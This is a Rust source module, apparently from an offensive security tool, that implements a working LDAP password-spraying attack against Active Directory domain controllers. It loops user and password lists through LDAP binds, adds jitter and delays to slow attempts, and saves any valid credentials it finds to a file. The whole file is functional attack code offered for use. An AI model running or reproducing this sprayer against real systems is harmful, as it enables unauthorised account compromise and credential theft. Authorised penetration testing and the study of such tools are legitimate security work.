use crate::args::ProxyConfig;
use crate::args::SprayArgs;
use crate::help::print_timestamp;
use chrono::Local;
use ldap3::{LdapConn};
use rand::Rng;
use std::error::Error;
use std::fs::File;
use std::io::{self, BufRead, Write};
use std::path::Path;
use std::thread;
use std::time::Duration;
use std::net::TcpStream;
use crate::help::add_terminal_spacing;

pub struct SprayConfig {
    pub userfile: String,
    pub passwords: String,
    pub domain: String,
    pub dc_ip: String,
    pub hash: Option<String>,
    pub timestamp_format: bool,
    pub proxy: Option<ProxyConfig>,
    pub threads: u32,
    pub jitter: u32,
    pub delay: u64,
    pub continue_on_success: bool,
    pub verbose: bool,
}

impl SprayConfig {
    pub fn from_args(args: &SprayArgs) -> Result<Self, Box<dyn Error>> {
        Ok(SprayConfig {
            userfile: args.userfile.clone(),
            passwords: args.password.clone(),
            domain: args.domain.clone(),
            dc_ip: args.dc_ip.clone(),
            hash: args.hash.clone(),
            timestamp_format: args.timestamp_format,
            proxy: args.proxy.clone(),
            threads: args.threads,
            jitter: args.jitter,
            delay: args.delay,
            continue_on_success: args.continue_on_success,
            verbose: args.verbose,
        })
    }
}

pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
    add_terminal_spacing(1);
    println!("[*] Target: {}", config.dc_ip);
    println!("[*] Domain: {}", config.domain);

    let ldap_url = if config.dc_ip.starts_with("ldap://") {
        config.dc_ip.clone()
    } else {
        format!("ldap://{}", config.dc_ip)
    };

    // Extract host from ldap_url for TCP check
    let host = if ldap_url.starts_with("ldap://") {
        ldap_url.trim_start_matches("ldap://").to_string()
    } else {
        ldap_url.clone()
    };

    let port = 389;
    let timeout = Duration::from_secs(10); // 10 second timeout

    // Test LDAP connectivity first
    println!("[*] Testing LDAP connectivity to {}", ldap_url);
    match check_ldap_port(&host, port, timeout) {
        Ok(_) => println!("[+] Successfully connected to LDAP server"),
        Err(e) => return Err(format!("[-] Failed to connect to LDAP server: {}", e).into()),
    }

    let users = read_users(&config.userfile)?;
    let passwords = read_lines(&config.passwords)?;

    println!("[*] Loaded {} users", users.len());
    println!("[*] Loaded {} passwords", passwords.len());
    println!("[*] Starting password spray at {}\n", print_timestamp());

    let timestamp = Local::now().format("%Y%m%d_%H%M%S");
    let output_file = format!("found_credentials_{}.txt", timestamp);
    let mut found_creds = None;
    let mut valid_credentials_found = false;
    let total_attempts = users.len() * passwords.len();
    let mut attempt_count = 0;

    for (password_index, password) in passwords.iter().enumerate() {
        println!("\n[*] Testing password: '{}' ({}/{} passwords)", 
            password, 
            password_index + 1,
            passwords.len()
        );
        
        for (_user_index, user) in users.iter().enumerate() {
            attempt_count += 1;
            let progress_percentage = (attempt_count as f64 / total_attempts as f64 * 100.0) as u32;
            
            // Show attempt details with percentage
            println!("[*] [{:3}%] Attempting login: {}@{} ({}/{} attempts)", 
                progress_percentage,
                user, 
                config.domain,
                attempt_count,
                total_attempts
            );

            // Add random delay between 0-X seconds if jitter is enabled
            if config.jitter > 0 {
                let delay = rand::thread_rng().gen_range(0..config.jitter);
                thread::sleep(Duration::from_millis(delay as u64));
            }
            
            match try_login(&ldap_url, user, &password, &config.domain) {
                Ok(true) => {
                    if found_creds.is_none() {
                        found_creds = Some(File::create(&output_file)?);
                    }
                    
                    let success_msg = format!(
                        "[+] Valid credentials found!\n    Username: {}\n    Password: {}\n    Domain: {}\n    Server: {}\n",
                        user, password, config.domain, ldap_url
                    );
                    println!("\x1b[32m{}\x1b[0m", success_msg.trim());
                    
                    if let Some(file) = &mut found_creds {
                        file.write_all(success_msg.as_bytes())?;
                        file.flush()?;
                    }
                    valid_credentials_found = true;

                    if !config.continue_on_success {
                        println!("[*] Valid credentials found and continue_on_success is false. Stopping spray.");
                        return Ok(());
                    }
                }
                Ok(false) => {
                    if config.verbose {
                        println!("[-] Failed login: {}@{} with password: {}", 
                            user, config.domain, password);
                    }
                }
                Err(e) => {
                    if !e.to_string().contains("rc=49") && 
                       !e.to_string().contains("invalidCredentials") && 
                       !e.to_string().contains("AcceptSecurityContext error") {
                        eprintln!(
                            "\x1b[33m[!] Connection Error: {}@{} - {}\x1b[0m",
                            user, config.domain, e
                        );
                    } else if config.verbose {
                        println!("[-] Failed login: {}@{} with password: {}", 
                            user, config.domain, password);
                    }
                }
            }

            // Add configured delay between attempts if specified
            if config.delay > 0 {
                thread::sleep(Duration::from_secs(config.delay));
            }
        }
        
        println!("\n[*] Completed password: '{}' - Progress: {}/{} ({}%)", 
            password,
            password_index + 1,
            passwords.len(),
            ((password_index + 1) as f64 / passwords.len() as f64 * 100.0) as u32
        );
    }

    println!("\n[*] Password spray complete");
    println!("[*] Total attempts: {}", attempt_count);
    if valid_credentials_found {
        println!("[+] Valid credentials were found and saved to: {}", output_file);
    } else {
        println!("[-] No valid credentials were found");
    }
    Ok(())
}

fn try_login(ldap_url: &str, username: &str, password: &str, domain: &str) -> Result<bool, Box<dyn Error>> {
    // Create LDAP connection
    let mut ldap = match LdapConn::new(ldap_url) {
        Ok(conn) => conn,
        Err(e) => return Err(Box::new(e)),
    };

    // Format username with domain (UPN format)
    let bind_dn = format!("{}@{}", username.trim(), domain);

    // Attempt bind
    match ldap.simple_bind(&bind_dn, password) {
        Ok(result) => {
            match result.success() {
                Ok(_) => Ok(true),  // Successful login
                Err(_) => Ok(false) // Failed login
            }
        },
        Err(e) => {
            let error_string = e.to_string();
            // Check if this is an invalid credentials error (code 49)
            if error_string.contains("rc=49") || 
               error_string.contains("invalidCredentials") || 
               error_string.contains("AcceptSecurityContext error") {
                Ok(false)  // Invalid credentials - failed login
            } else {
                // Only real connection errors should be reported as errors
                Err(Box::new(e))
            }
        }
    }
}

fn read_lines<P>(filename: P) -> io::Result<Vec<String>>
where
    P: AsRef<Path>,
{
    let file = File::open(filename)?;
    let lines = io::BufReader::new(file)
        .lines()
        .filter_map(|line| line.ok())
        .filter(|line| !line.trim().is_empty())
        .collect();
    Ok(lines)
}

fn read_users(user_input: &str) -> io::Result<Vec<String>> {
    // If the input looks like a file path, try to read it
    if Path::new(user_input).exists() {
        read_lines(user_input)
    } else {
        // If not a file, treat it as a direct username
        Ok(vec![user_input.to_string()])
    }
}

fn check_ldap_port(host: &str, port: u16, _timeout: Duration) -> Result<(), Box<dyn Error>> {
    match TcpStream::connect((host, port)) {
        Ok(_) => Ok(()),
        Err(e) => Err(Box::new(e)),
    }
}
